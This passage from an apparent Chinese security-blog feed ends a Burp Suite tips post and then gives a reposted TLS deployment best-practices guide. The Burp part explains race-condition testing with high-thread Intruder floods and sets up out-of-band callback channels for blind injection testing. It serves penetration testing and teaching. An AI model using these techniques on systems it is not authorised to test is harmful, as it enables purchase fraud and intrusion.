条件竞争漏洞测试</h2><p>“竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p><p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>简单的说：本来你有100块钱，买一个商品要花100，你可以多开启多个线程去跑，有可能不止一个用户买成功</p><p>“竞争条件”漏洞有时很难通过黑盒/灰盒的方法来进行挖掘，因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等。一般都会通过对代码进行审计来发现此类问题</p><p>可以使用Burp的intruder功能来实现发送多个并发请求</p><p>将请求包发送至Intruder</p><p>Intruder – Payloads – Payload Stes </p><p>Payload type设置为NUll payloads</p><p>Payload Options 次数设置100次</p><img src="/burp/payload1.png" title="payload1"><p>Intruder – Options – Request Engine</p><p>线程数设置最大999 ，点击Start attack</p><img src="/burp/payload2.png" title="payload1"><h2 id="0x08-DNSlog功能"><a href="#0x08-DNSlog功能" class="headerlink" title="0x08 DNSlog功能"></a>0x08 DNSlog功能</h2><p>Burp Collaborator是从Burp suite v1.6.15版本添加的新功能，也就是DNSlog，监控DNS解析记录和HTTP访问记录，在检测盲注类漏洞很好用，也可以借助第三方服务</p><p>这里引出两个概念，<strong>In-band attack与 out-band attack（带内与带外攻击）</strong>，带内与带外的区别核心在于是否使用不同的通信通道。</p><ul><li>带内攻击<br>在一次攻击当中,只有一条通道，属于in-band（带内）攻击。常规的web测试模型就是我们向目标发送payloads，然后分析目标返回的数据。</li><li>带外攻击<br>现在同一次攻击下，不止一条信道，则属于out-band（带外）攻击。与外部服务交互行为发生在一个payload提交到目标应用上，导致目标通过某个网络协议和一个外部的域名进行信息交互。和ssrf攻击类似，让目标与Collaborator交互</li></ul><p>首先通过project options - misc - burp collaborator server - run health check 检查信道是否通畅</p><img src="/burp/colla_check.png" title="colla_check"><p>启用 主界面菜单项 burp - burp collaborator client 即可启用</p><p>点击Copy 头clipboard ，添加到payload中</p><img src="/burp/colla_client.png" title="colla_client"><p>带外信道根据不同场景一般用如下几类：</p><ol><li>burp 自带的 collaborator。主界面菜单项 burp - burp collaborator client 即可启用，可以在 project options - misc - burp collaborator server - run health check 检查信道是否通畅。无需第三方服务、不用注册，即开即用。由于我 burp 不离手，所以，这种带外信道方便、集成度高是它的最大优点，另外，burp 进行各类盲注（XXE、SQLi、CMDi 等等）的主动扫描时，也会用到 collaborator；</li><li>用脚本语言快速启用 web server。运行 python3 -m http.server 8653 或 php -S 0.0.0.0:8088 后，所有对它的 GET、HEAD 请求几类都能在日志中查看到。这种方式非常适用于攻击端与目标同在内网的场景，比如，无公网环境的 CTF 竞赛。不支持 POST 是它最大的短板；</li><li>借助第三方服务（<a href="http://ceye.io/、http://requestbin.net/）。效果上，类似第二种方式，但支持" target="_blank" rel="noopener">http://ceye.io/、http://requestbin.net/）。效果上，类似第二种方式，但支持</a> DNS 查询、HTTP POST 方法，此外，由于这是长期有效的服务，所以，很适用于那些非实时触发的带外访问请求（如，二次 SQLi）。你可以隔两三天再去看有无访问记录。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Burp Suite是Web应用程序测试的最佳工具之一，其多种功能可以帮我们执行各种任务.请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查。&lt;/p&gt;
&lt;p&gt;大家都很熟悉工具的使用了，这里介绍几个技巧，&lt;strong&gt;欢迎大家补充&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS 安全最佳实践（转发）</title>
    <link href="http://www.pa55w0rd.club/https-sec-deploy/"/>
    <id>http://www.pa55w0rd.club/https-sec-deploy/</id>
    <published>2018-12-12T10:39:23.000Z</published>
    <updated>2018-12-12T09:23:02.140Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文：<a href="https://blog.myssl.com/ssl-and-tls-deployment-best-practices/" target="_blank" rel="noopener">https://blog.myssl.com/ssl-and-tls-deployment-best-practices/</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSL/TLS 是一种简单易懂的技术，它很容易部署及运行。但想要部署的安全通常是不容易的。这也使系统管理员和开发者不得不去了解 SSL 和 TLS 相关的技术，掌握如何配置一个安全的 web 服务器或应用。无疑会耗费很大的精力去看相关的技术文档，乏味且宽泛。</p><p>本篇文档的目的在于如何让系统管理员或开发者用尽可能少的时间部署一个安全的 web 站点或应用，即 SSL 和 TLS 部署最佳实践。</p><h2 id="0x01-SSL-TLS部署"><a href="#0x01-SSL-TLS部署" class="headerlink" title="0x01 SSL/TLS部署"></a>0x01 SSL/TLS部署</h2><h3 id="1-1-证书和私钥"><a href="#1-1-证书和私钥" class="headerlink" title="1.1 证书和私钥"></a>1.1 证书和私钥</h3><p>在TLS中，所有的安全性都从服务器的密码标识开始；需要一个强大的私钥来防止攻击者进行模拟攻击。同样重要的是要有一个有效的和强大的证书，这将授予私有密匙作为一个特定主机名的权利。没有这两个基本的构建块，就没有其他东西可以安全了。</p><h4 id="1-1-1-使用-2048-位私钥"><a href="#1-1-1-使用-2048-位私钥" class="headerlink" title="1.1.1 使用 2048 位私钥"></a>1.1.1 使用 2048 位私钥</h4><p>对于大多数的 web 站点，提供一个 2048 的 RSA key 是足够安全的。<a id="more"></a>RSA 的公钥算法是被普遍支持的，这使得这个类型的 key 作为默认是足够安全的。对于 2048 位，这些 key 提供了大约 112 位的安全性。如果您想要比这更多的安全性，请注意 RSA key 的伸缩性不太好。想要获得 128 位的安全性，你需要 3072 位 RSA key，这会很大的影响性能。ECDSA key 提供了一种提供更好安全性和更好性能的替代方法。对于 256 位，ECDSA key 提供 128 位安全性。少数古董客户端不支持 ECDSA，但现代客户端是支持的。如果您不介意管理这样一个设置的开销，那么您可以同时部署 RSA 和 ECDSA 密钥。</p><h4 id="1-1-2-保护你的私钥"><a href="#1-1-2-保护你的私钥" class="headerlink" title="1.1.2 保护你的私钥"></a>1.1.2 保护你的私钥</h4><p>把你的私钥视为一项重要的资产，尽可能最大的使用你的私钥，限制最小的员工的访问。建议的政策包括以下内容:</p><ul><li>在可信计算机上用足够的熵生成私有密钥。一些 CA 为您提供生成私钥的功能，请尽量不要这样做。</li><li>密码保护 key 最初就不要存储在备份系统中。私钥密码在生产环境中起不了什么作用，因为有知识的攻击者总是能够从进程内存中检索密钥。有硬件设备(被称为硬件安全模块，或 HSMs)，即使在服务器折衷的情况下，也可以保护私有密匙，但是它们是昂贵的，因此仅适用于具有严格安全性需求的组织。</li><li>妥协后，撤销旧证书并生成新密钥。</li><li>每年更新证书，如果您可以自动化过程，则更频繁。大多数网站都应该假定不可靠的妥协证书被撤销; 因此，具有较短使用寿命的证书在实践中更加安全。</li><li>除非保持相同的密钥对于公钥密钥很重要，否则每当获得新证书时，还应该生成新的私钥。</li></ul><h4 id="1-1-3-覆盖您的域名"><a href="#1-1-3-覆盖您的域名" class="headerlink" title="1.1.3 覆盖您的域名"></a>1.1.3 覆盖您的域名</h4><p>确保您的证书涵盖您希望与网站一起使用的所有名称。您的目标是避免无效的证书警告，这会混淆用户，削弱他们的信心。</p><p>即使您期望只使用一个域名，请记住，您无法控制用户到达该网站的方式或其他人如何链接到该网站。在大多数情况下，您应该确保该证书与 www 前缀有关（例如，它适用于 example.com 和<br><a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> ）。经验法则是，安全的 Web 服务器应该具有对配置为指向它的每个 DNS 名称有效的证书。</p><p>通配符证书能满足更广泛的需求，但如果准备将密钥暴露给更多的人员，特别是跨团队或部门，则避免使用它们。换句话说，访问私钥的人越少越好。还要注意，证书共享会创建一个可以被滥用的将漏洞从一个网站或服务器传输到使用相同证书的所有其他站点和服务器（即使底层私钥不同，只要证书域名匹配）的绑定。</p><h4 id="1-1-4-从可信-CA-获取证书"><a href="#1-1-4-从可信-CA-获取证书" class="headerlink" title="1.1.4 从可信 CA 获取证书"></a>1.1.4 从可信 CA 获取证书</h4><p>选择对其证书业务和安全性可靠和认真的认证中心（CA）。选择 CA 时，请考虑以下条件：</p><p><strong>安全状态</strong> 所有CA都经过定期审核，但有些则比其他 CA 更为严重。弄清哪些在这方面做的更好并不容易，但一个选择是检查他们的安全历史，更重要的是，他们如何反应妥协，如果他们从错误中学到了经验，这将更有利。</p><p><strong>业务重点</strong> CA 的活动构成其业务的重要组成部分，如果事情发生严重错误，其所有事情都将丢失，并且在其他地方追逐潜在的更有利可图的机会可能不会忽视其证书部门。</p><p><strong>提供的服务</strong> 至少，您选择的 CA 应提供对证书吊销列表（CRL）和在线证书状态协议（OCSP）撤销方法的支持，具有稳定的网络可用性和性能。许多网站对域验证的证书感到满意，但您也应该考虑是否需要扩展验证（EV）证书。在任一种情况下，您都应该选择公钥算法。大多数网站今天使用 RSA，但由于其性能优势，ECDSA 在未来可能会变得重要。</p><p><strong>证书管理</strong> 选项如果您需要大量证书并在复杂环境中运行，请选择一个 CA，为您提供良好的管理工具。</p><p>支持选择一个 CA，如果需要的话可以给您很好的支持。</p><blockquote><p>   注意<br><br>   为了获得最佳效果，请提前获得证书，并在部署到生产之前至少一周。这种做法<br>（1）有助于避免在计算机上没有正确时间的一些用户的证书警告;<br>（2）有助于避免与 CA 需要额外时间的 CA 失败的撤销检查，以向 OCSP 响应者传播有效的新证书。<br>随着时间的推移，尝试将这个“热身”期延长至 1-3 个月。同样，不要等到你的证书即将到期以替换它们。留下额外的几个月也会帮助时钟不正确的人在另一个方向。</p></blockquote><h4 id="1-1-5-使用强签名算法"><a href="#1-1-5-使用强签名算法" class="headerlink" title="1.1.5 使用强签名算法"></a>1.1.5 使用强签名算法</h4><p>证书安全性取决于</p><ol><li>用于签署证书的私钥的强度，</li><li>签名中使用的散列函数的强度。</li></ol><p>直到最近，大多数证书都依赖于 SHA1 散列函数，现在被认为是不安全的。因此，我们正在向 SHA256 转型。截至 2016 年 1 月，您无法从公共 CA 获取 SHA1 证书。现有的 SHA1 证书将继续工作（在某些浏览器中有警告），但只能到 2016 年底。</p><h3 id="1-2-配置"><a href="#1-2-配置" class="headerlink" title="1.2 配置"></a>1.2 配置</h3><p>使用正确的 TLS 服务器配置，您可以确保将凭据正确呈现给站点的访问者，仅使用安全的加密原语，并减轻所有已知的缺陷。</p><h4 id="1-2-1-使用完整的证书链"><a href="#1-2-1-使用完整的证书链" class="headerlink" title="1.2.1 使用完整的证书链"></a>1.2.1 使用完整的证书链</h4><p>在大多数部署中，仅服务器证书不够的; 需要两个或多个证书来建立完整的信任链。当部署具有有效证书但没有所有必要的中间证书的服务器时，会发生常见的配置问题。为避免这种情况，只需使用 CA 提供给您的所有证书。</p><p>无效的证书链有效地使服务器证书无效并导致浏览器警告。实际上，这个问题有时难以诊断，因为一些浏览器可以重构不完整的链，有些浏览器不能重建。所有浏览器都倾向于缓存和重用中间证书。</p><h4 id="1-2-2-使用安全的协议"><a href="#1-2-2-使用安全的协议" class="headerlink" title="1.2.2 使用安全的协议"></a>1.2.2 使用安全的协议</h4><p>SSL／TLS 系列中有五种协议：SSL v2，SSL v3，TLS v1.0，TLS v1.1和TLS v1.2：</p><ul><li>SSL v2 是不安全的，不能使用。此协议版本非常糟糕，即使它们位于完全不同的服务器（DROWN 攻击）上也可以用来攻击具有相同名称的RSA 密钥和站点。</li><li>当与 HTTP（POODLE 攻击）一起使用时，SSL v3 是不安全的，当与其他协议一起使用时，SSL v3 是弱的。它也是过时的，不应该被使用。</li><li>TLS v1.0 也是不应该使用的传统协议，但在实践中通常仍然是必需的。其主要弱点（BEAST）在现代浏览器中得到缓解，但其他问题仍然存在。</li><li>TLS v1.1 和 v1.2 都没有已知的安全问题，只有 v1.2 提供了现代的加密算法。</li></ul><p>TLS v1.2 应该是您的主要协议，因为它是唯一提供现代认证加密（也称为 AEAD）的版本。如果您今天不支持 TLS v1.2，则缺乏安全性。</p><p>为了支持较旧的客户端，您可能需要继续支持 TLS v1.0 和TLS v1.1。但是，您应该计划在不久的将来退出 TLS v1.0。例如，PCI DSS 标准将要求所有接受信用卡付款的网站在 2018 年 6 月之前移除对 TLS v1.0 的支持。</p><p>目前正在开展设计 TLS v1.3 的工作，其目的是消除所有过时和不安全的功能，并进行改进，以保持我们的通信在未来几十年内的安全。</p><h4 id="1-2-3-使用安全的套件"><a href="#1-2-3-使用安全的套件" class="headerlink" title="1.2.3 使用安全的套件"></a>1.2.3 使用安全的套件</h4><p>为了安全通信，您必须首先确定您正在与所需方（而不是通过将窃听的其他人）直接沟通并安全地交换数据。在 SSL 和 TLS 中，密码套件定义了如何进行安全通信。它们由不同的建筑组成，通过多样性实现安全。如果发现其中一个构建块软弱或不安全，那么您应该可以切换到另一个。</p><p>您应该主要依靠提供强身份验证和密钥交换，前向保密和至少 128 位加密的 AEAD 套件。还有一些其他较弱的套房可能仍然得到支持，只要它们只能与不支持任何更好的老客户进行协商。</p><p>有几个过时的加密原语必须避免：</p><ul><li>匿名 Diffie-Hellman（ADH）套件不提供身份验证。</li><li>NULL 密码套件不提供加密。</li><li>导出密码套件在连接中协商时不安全，但也可以针对更喜欢更强大的套件（FREAK攻击）的服务器使用。</li><li>弱密码（通常为 40 和 56 位）的套件使用可以轻松破坏的加密。</li><li>RC4 是不安全的。<a href="http://www.rfc-editor.org/rfc/rfc7465.txt" target="_blank" rel="noopener">rfc7465</a></li><li>3DES 缓慢而虚弱。</li></ul><p>使用以RSA和ECDSA键为基础的以下套件配置，作为起点：<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_ECDHE_ECDS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA384</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_ECDHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA384</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_GCM_SHA256</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_GCM_SHA384</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_128_CBC_SHA256</span><br><span class="line">TLS_DHE_RS<span class="built_in">A_WITH</span>_AES_256_CBC_SHA256</span><br></pre></td></tr></table></figure></p><blockquote><p>警告<br><br>我们建议您始终首先在分段环境中测试TLS配置，仅在确定所有内容按预期工作时将更改应用到生产环境。请注意，以上是一个通用列表，并不是所有系统（特别是较旧的）支持所有套件。这就是为什么测试很重要，推荐您使用《<a href="https://myssl.com/" target="_blank" rel="noopener">SSL/TLS安全评估</a>》进行检查。</p></blockquote><p>上述示例配置使用标准 TLS 套件名称。一些平台使用非标准名称; 有关详细信息，请参阅您的平台的文档。例如，以下套件名称将与OpenSSL 一起使用：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ECDHE-ECDSA-AES128-GCM-<span class="keyword">SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-ECDSA-AES256-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">ECDHE-RSA-AES256-SHA384</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-GCM-SHA384</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-SHA</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-SHA</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES128-SHA256</span></span><br><span class="line"><span class="keyword">DHE-RSA-AES256-SHA256</span></span><br></pre></td></tr></table></figure></p><h4 id="1-2-4-选择合适的协议"><a href="#1-2-4-选择合适的协议" class="headerlink" title="1.2.4 选择合适的协议"></a>1.2.4 选择合适的协议</h4><p>在SSL v3及更高版本的协议版本中，客户端提交他们支持的密码套件列表，服务器从列表中选择一个用于连接的套件。然而，并不是所有的服务器都做得很好，有些将从客户端列表中选择第一个支持的套件。使服务器主动选择最佳可用加密套件对于实现最佳安全性至关重要。</p><h4 id="1-2-5-使用-FS"><a href="#1-2-5-使用-FS" class="headerlink" title="1.2.5 使用 FS"></a>1.2.5 使用 FS</h4><p>前向保密（有时也称为完全前向保密）是一种协议功能，可实现不依赖服务器私钥的安全对话。对于不提前向保密的密码套件，可以恢复服务器的私钥的人就可以解密所有较早记录的加密对话（也就是可以先大量记录密文，再解密，比如您的证书到期后没有正确销毁，它的私钥就能用来解密非PFS的密文）。您需要支持并喜欢 ECDHE 套件，以便通过现代网络浏览器实现前向保密。为了支持更广泛的客户，您还应该使用 DHE 套件作为 ECDHE 后备。避免 RSA 密钥交换，除非绝对必要。我在2.3节中提出的默认配置只包含提供前向保密的套件。</p><h4 id="1-2-6-使用强的密钥交换算法"><a href="#1-2-6-使用强的密钥交换算法" class="headerlink" title="1.2.6 使用强的密钥交换算法"></a>1.2.6 使用强的密钥交换算法</h4><p>对于密钥交换，公共站点通常可以选择经典的短暂的 Diffie-Hellman密钥交换（DHE）和其椭圆曲线变体 ECDHE。还有其他的密钥交换算法，但是它们通常是以某种方式不安全的。RSA 密钥交换仍然很受欢迎，但不提供前向保密。</p><p>2015 年，一批研究人员发表了对 DHE 的新攻击; 他们的工作被称为Logjam 攻击。[2] 研究人员发现，较低强度的 DH 密钥交换（例如768 位）容易被破坏，一些知名的 1024 位 DH 组可被国家机构破坏。为了安全起见，如果部署 DHE，请至少配置 2048 位的安全性。一些较老的客户端（例如Java 6）可能不支持这种强度。出于性能原因，大多数服务器应该更喜欢 ECDHE，这是更强大和更快。在这种情况下，secp256r1命名曲线（也称为 P-256）是一个很好的选择。</p><h3 id="1-3-减轻已知问题"><a href="#1-3-减轻已知问题" class="headerlink" title="1.3 减轻已知问题"></a>1.3 减轻已知问题</h3><p>近几年来已经发生了几次严重的 SSL 和 TLS 攻击，但是如果您正在运行最新的软件并遵循本指南的建议，那么它们通常不会关心您。（如果没有，我建议您使用 MYSSL 测试您的系统，并从中进行测试）。但是，没有什么是完全安全的，所以为了保持对安全性的了解，这是一个很好的做法。如果供应商补丁可用，请及时提供; 否则，依靠解决方案进行缓解。</p><h3 id="1-4-性能"><a href="#1-4-性能" class="headerlink" title="1.4 性能"></a>1.4 性能</h3><p>安全是我们在本指南中的主要重点，但我们也要注意表现; 一个不符合性能标准的安全服务无疑将被丢弃。通过正确配置，TLS 可以相当快。使用现代协议（例如 HTTP/2），甚至可能比明文通信更快。</p><h4 id="1-4-1-避免过度安全"><a href="#1-4-1-避免过度安全" class="headerlink" title="1.4.1 避免过度安全"></a>1.4.1 避免过度安全</h4><p>用于建立安全连接的密码握手是一种操作，其费用受私钥大小的高度影响。使用太短的密钥是不安全的，但使用太长的密钥将导致“太多”的安全性和缓慢的操作。对于大多数网站，使用超过 2048 位的 RSA 密钥和强大于 256 位的 ECDSA 密钥会浪费 CPU 功耗，并可能会损害用户体验。类似地，增加短暂密钥交换的强度对于 DHE 为 2048 位以及 ECDHE 为 256 位几乎没有什么好处。使用高于 128 位的加密没有明显的好处。</p><h4 id="1-4-2-使用-session-恢复"><a href="#1-4-2-使用-session-恢复" class="headerlink" title="1.4.2 使用 session 恢复"></a>1.4.2 使用 session 恢复</h4><p>会话恢复是一种性能优化技术，可以节省昂贵的密码操作的结果，并重复使用一段时间。残疾或非功能性会话恢复机制可能会引起显着的性能损失。</p><h4 id="1-4-3-使用-WAN-优化和-HTTP-2"><a href="#1-4-3-使用-WAN-优化和-HTTP-2" class="headerlink" title="1.4.3 使用 WAN 优化和 HTTP/2"></a>1.4.3 使用 WAN 优化和 HTTP/2</h4><p>这些天，TLS 开销不是来自 CPU 饥饿的加密操作，而是来自网络延迟。只有在 TCP 握手完成后才能启动TLS握手，需要进一步交换数据包，并且离开服务器的距离更远。最小化延迟的最佳方法是避免创建新的连接 - 换句话说，保持现有的连接长时间（keep-alives）。提供良好结果的其他技术包括支持现代协议（如HTTP / 2）和使用WAN优化（通常通过内容传送网络）。</p><h4 id="1-4-4-隐藏公共内容"><a href="#1-4-4-隐藏公共内容" class="headerlink" title="1.4.4 隐藏公共内容"></a>1.4.4 隐藏公共内容</h4><p>通过TLS进行通信时，浏览器可能会认为所有流量都是敏感的。它们通常会使用内存来缓存某些资源，但一旦关闭浏览器，所有内容可能会丢失。为了获得性能提升，并能够长期缓存一些资源，将公共资源（例如图像）标记为公开。</p><h4 id="1-4-5-使用-OCSP-Stapling"><a href="#1-4-5-使用-OCSP-Stapling" class="headerlink" title="1.4.5 使用 OCSP Stapling"></a>1.4.5 使用 OCSP Stapling</h4><p>OCSP 装订是 OCSP 协议的扩展，可以直接从服务器提供撤销信息作为 TLS 握手的一部分。因此，客户端不需要联系 OCSP 服务器进行带外验证，并且总体 TLS 连接时间显着减少。OCSP 装订是一种重要的优化技术，但您应该注意，并不是所有的网络服务器都提供了可靠的 OCSP 装订实现。结合具有缓慢或不可靠的 OCSP 响应者的 CA，这样的 Web 服务器可能会产生性能问题。为了获得最佳效果，请模拟故障条件，看看它们是否会影响您的可用性。</p><h4 id="1-4-6-使用快速加密"><a href="#1-4-6-使用快速加密" class="headerlink" title="1.4.6 使用快速加密"></a>1.4.6 使用快速加密</h4><p>除了提供最佳的安全性，我推荐的密码套件配置也提供了最好的性能。尽可能使用支持硬件加速 AES 的 CPU。之后，如果您真的想要进一步的性能优势（大多数网站可能不需要），请考虑使用 ECDSA 密钥。</p><h3 id="1-5-HTTP-和-应用安全"><a href="#1-5-HTTP-和-应用安全" class="headerlink" title="1.5 HTTP 和 应用安全"></a>1.5 HTTP 和 应用安全</h3><p>HTTP 协议和 Web 应用交付的周边平台在 SSL 诞生后继续快速发展。作为这一进化的结果，该平台现在包含可用于打败加密的功能。在本节中，我们列出了这些功能，以及安全使用它们的方法。</p><h4 id="1-5-1-加密无处不在"><a href="#1-5-1-加密无处不在" class="headerlink" title="1.5.1 加密无处不在"></a>1.5.1 加密无处不在</h4><p>加密是可选的事实可能是今天最大的安全问题之一。我们看到以下问题：</p><ul><li>没有 TLS 需要它的网站</li><li>具有 TLS 但不执行 TLS 的站点</li><li>混合 TLS 和非 TLS 内容的网站，有时甚至在同一网页内</li><li>编程错误的网站会颠覆 TLS</li></ul><p>尽管如果您确切了解您正在做的事情，许多这些问题可以被缓解，可靠地保护网站通信的唯一方法是无一例外地执行加密。</p><h4 id="1-5-2-消除混合内容"><a href="#1-5-2-消除混合内容" class="headerlink" title="1.5.2 消除混合内容"></a>1.5.2 消除混合内容</h4><p>混合内容页面是通过 TLS 传输但是包含不通过 TLS 传输的资源（例如，JavaScript 文件，images，CSS 文件）的页面。这样的页面不安全。一个活跃的中间人（MITM）攻击者可以搭载一个单独的未受保护的 JavaScript 资源，例如劫持整个用户会话。即使您遵循上一节的建议并对整个网站加密，您仍然可能会最终从第三方网站中检索未加密的一些资源。</p><h4 id="1-5-3-使用可信第三方"><a href="#1-5-3-使用可信第三方" class="headerlink" title="1.5.3 使用可信第三方"></a>1.5.3 使用可信第三方</h4><p>网站通常使用通过从另一个服务器下载的 JavaScript 代码激活的第三方服务。这种服务的一个很好的例子是 Google Analytics（分析），用于 Web 的大部分。这种包含第三方代码创建一个隐含的信任连接，有效地使对方完全控制您的网站。第三方可能不是恶意的，但是这些服务的大型提供商越来越被视为目标。推理很简单：如果大型提供程序受到威胁，攻击者将被自动访问所有依赖该服务的站点。</p><p>如果您遵循第4.2节的建议，至少您的第三方链接将被加密，从而避免 MITM 攻击。但是，您应该进一步了解：了解您使用的服务和删除服务，将其替换为更安全的替代方案，或接受其继续使用的风险。一种称为子资源完整性（SRI）的新技术可用于通过第三方资源来减少潜在的风险。[3]</p><h4 id="1-5-4-安全-cookie"><a href="#1-5-4-安全-cookie" class="headerlink" title="1.5.4 安全 cookie"></a>1.5.4 安全 cookie</h4><p>要正确安全，网站需要 TLS，而且所有的 Cookie 在创建时都被明确标记为安全的。未能保护 cookies 可以让活跃的 MITM 攻击者通过聪明的技巧来挑逗一些信息，即使在 100％ 加密的网站上也是如此。为了获得最佳效果，请考虑为您的 Cookie 添加加密完整性验证或甚至加密。</p><h4 id="1-5-5-安全-HTTP-压缩"><a href="#1-5-5-安全-HTTP-压缩" class="headerlink" title="1.5.5 安全 HTTP 压缩"></a>1.5.5 安全 HTTP 压缩</h4><p>2012 年 CRIME 攻击显示 TLS 压缩无法安全实施。唯一的解决方案是完全禁用 TLS 压缩。次年，随后再发生两次攻击。TIME 和 BREACH 专注于使用 HTTP 压缩压缩的 HTTP 响应实体中的秘密。与 TLS 压缩不同，HTTP 压缩是必需的，不能关闭。因此，为了解决这些攻击，需要对应用程序代码进行更改。[4]</p><p>TIME 和 BREACH 攻击并不容易实现，但是如果某人有足够的动力使用它们，则这种影响大致相当于成功的跨站点请求伪造（CSRF）攻击。</p><h4 id="1-5-6-部署-HSTS"><a href="#1-5-6-部署-HSTS" class="headerlink" title="1.5.6 部署 HSTS"></a>1.5.6 部署 HSTS</h4><p>HTTP 严格传输安全（HSTS）是 TLS 的安全网。它旨在确保即使在配置问题和实施错误的情况下，安全性仍然保持不变。要激活 HSTS 保护，您可以向您的网站添加一个新的响应头。之后，支持 HSTS（此时所有现代浏览器）的浏览器执行它。</p><p>HSTS 的目标很简单：激活后，它不允许与使用它的网站进行任何不安全的通信。通过自动将所有明文链接转换为安全的链接，实现了这一目标。作为奖励，它还会禁用点击式证书警告。（证书警告是活动的 MITM 攻击的指标，研究表明大多数用户点击这些警告，所以绝对不要让他们感兴趣）。</p><p>添加对 HSTS 的支持是您可以为您的网站的 TLS 安全性做出的最重要的改进。新站点始终应设计为 HSTS，旧站点转换为尽可能快地支持。为了获得最佳安全性，请考虑使用 HSTS 预加载[5]，将HSTS配置嵌入到现代浏览器中，从而使您的网站的第一个连接安全。</p><p>以下配置示例将在主主机名及其所有子域上激活一段时间为一年的 HSTS，同时还允许预加载：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: <span class="built_in">max</span>-age=<span class="number">31536000</span>; includeSubDomains; <span class="built_in">preload</span></span><br></pre></td></tr></table></figure></p><h4 id="1-5-7-部署-CSP"><a href="#1-5-7-部署-CSP" class="headerlink" title="1.5.7 部署 CSP"></a>1.5.7 部署 CSP</h4><p>内容安全策略（CSP）是网站可以用来限制浏览器操作的安全机制。尽管最初旨在解决跨站点脚本（XSS），CSP 